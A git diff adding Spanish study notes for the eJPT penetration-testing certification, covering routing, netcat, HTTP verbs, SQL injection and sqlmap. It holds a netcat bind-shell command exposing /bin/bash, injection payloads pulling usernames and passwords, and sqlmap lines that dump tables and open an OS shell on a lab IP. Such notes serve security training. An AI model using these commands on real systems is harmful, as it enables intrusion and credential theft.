@@ -1,5 +1,20 @@
 # eJPT
  
+   ## Routing table
+   
+   Ver tabla de rutas:
+   
+    netstat -rn
+    Kernel IP routing table
+    Destination      Gateway        Genmask         Flags   MSS Window  irtt Iface
+    ...
+    192.168.88.0     10.10.34.1     255.255.255.0   UG        0 0          0 tap0
+    ...
+ 
+ Añadir ruta:
+ 
+    ip route add 192.168.88.0/24 via 10.10.34.1
+ 
    ## Network mapping
 
    Para hacer ping a un rango de IP's, utilizamos fping:
@@ -81,7 +96,21 @@ Parámetros de escaneo:
     HEAD /en_en/ HTTP/1.1
     Host: www.ferrari.com
     
-   ## Openssl
+ ## Netcat server (listener)
+ 
+    nc -lvp 8888
+    
+ -lvp = listener / verbosity / port
+ 
+   Si escucha en 0.0.0.0 -> escucha desde todas las interfaces. 
+   
+   Para conectar a ese servidor en puerto 8888 desde otra terminal:
+   
+    nc -v 127.0.0.1 8888 (-e commando)
+    
+    Ejemplo: nc -lvp 1337 -e /bin/bash
+    
+## Openssl
    
  Si tenemos que enviar una petición HTTPS, tenemos que utilizar openssl, ya que netcat no funciona con peticiones https:
  
@@ -97,3 +126,100 @@ Parámetros de escaneo:
 
     OPTIONS / HTTP/1.1
     Host: hack.me
+
+   ## HTTP verbs
+   
+      GET -> abre o solicita un recurso, por ejemplo, una web desde el navegador. Puede pasar argumentos.
+      
+      POST -> envía HTML format data. Parámetros en el body (p.ej username, passwd...)
+      
+      HEAD -> como GET pero sólo para la cabecera
+      
+      PUT -> sube ficheros al servidor
+      
+      DELETE -> borra ficheros del servidor
+      
+      OPTIONS -> consulta al web server acerca de los verbos HTTP activos
+      
+  Para saber qué verbos tenemos disponibles, utilizamos:
+  
+     nc -v victim.site 80
+     
+     OPTIONS /HTTP/1.0
+     
+     Allow: GET, HEAD, POST
+     
+ Para borrar un recurso:
+ 
+    DELETE /path/to/resource.txt
+   
+Para subir un fichero, tenemos que saber antes cuanto es de largo nuestro payload.php:
+
+    wc -m payload.php
+    
+    
+## SQL Injection
+
+ <img src="https://user-images.githubusercontent.com/111526713/189478292-06a88aac-0e42-4218-8368-596098aa8e50.png" width="400" />
+ 
+ Se basa en tomar el control de las sentencias SQL utilizadas por la aplicación. 
+ 
+    $connection = objeto que referencia la conexión con la DB
+    $query = consulta a ejecutar
+    $mysqli_query() = función que envía la consulta a la DB
+    
+Necesitamos un código SQL dinámico, por ejemplo:
+
+    select name, description from products where ID=$id
+    
+    select name, description from products where ID='' or 'a'='a';
+    
+    http://urltest.com/view.php?id=1003'
+    
+    http://urltest.com/view.php?id='' or 1=1;-- -
+    
+    http://urltest.com/view.php?id='' or 1=21;-- -
+    
+ En este caso, buscamos por ID vacío, donde no nos devolverá ningún resultado, o donde la condición sea always true condition, donde mostrará todo el contenido de la tabla Productos.
+ 
+ También se puede hacer utilizando UNION SELECT:
+ 
+    select * from accounts where ID='' UNION SELECT username,pass from accounts where 'a'='a';
+  
+## SQLMAP
+
+    sqlmap -u url 
+           -b=database_banner
+           --tables= nos muestra las tablas de la BD
+           --current_db dbname -columns
+           --dump=passwords
+           --technique
+           -p= parámtero a inyectar
+           --users
+           --dbs
+           -D dbname -T table -C column1,column2 --dump
+           
+muestra las databases:
+
+    sqlmap -u http://10.10.10.15/?id=4 --dbs
+
+muestra las tablas:
+
+    sqlmap -u http://10.10.10.15/?id=4 -D dbname --tables
+
+si no aparecen, guess tables utilizia los nombres más comunes:
+
+    sqlmap -u http://10.10.10.15/?id=4 -D dbname --common-tables
+
+dump de datos de una tabla:
+
+    sqlmap -u http://10.10.10.15/?id=4 -D dbname -T table --dump
+
+consiguiendo os shell:
+
+    sqlmap -u http://10.10.10.15/?id=4 --os-shell
+
+           
+ Si tenemos que lanzarlo contra un login form (login.php)
+ 
+      sqlmap -u url --data='user=a&pass=b' -p user --technique=B(oolean)
